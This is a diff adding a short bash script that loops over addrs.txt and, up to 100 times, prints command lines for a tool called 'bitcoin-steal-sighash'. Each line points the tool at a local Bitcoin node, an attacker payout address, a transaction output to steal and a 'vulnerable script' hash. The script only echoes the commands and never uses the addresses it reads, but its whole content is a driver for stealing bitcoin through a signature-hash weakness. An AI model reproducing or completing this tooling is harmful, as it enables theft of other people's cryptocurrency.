@@ -1,0 +1,9 @@
+#!/usr/bin/env bash
+c=100
+while IFS= read -r p; do
+	echo ./bitcoin-steal-sighash --address 127.0.0.1:8332 --bitcoin-dir /mnt/h/Bitcoin --log-file ./log.txt --attacker-address 17ffpZVx45QV1dXAzypeMUwLN5ab5oYr8L --steal-txid d176d4960a78b41971f9d19207b59af6584b16ef323de55e983aec0100000000 --steal-vout 0 --vuln-script a35277c3ceb9c38da206be006e8c7ff8e94fc529
+	((c--))
+	if [ $c -eq 0 ]; then
+		break
+	fi
+done < addrs.txt
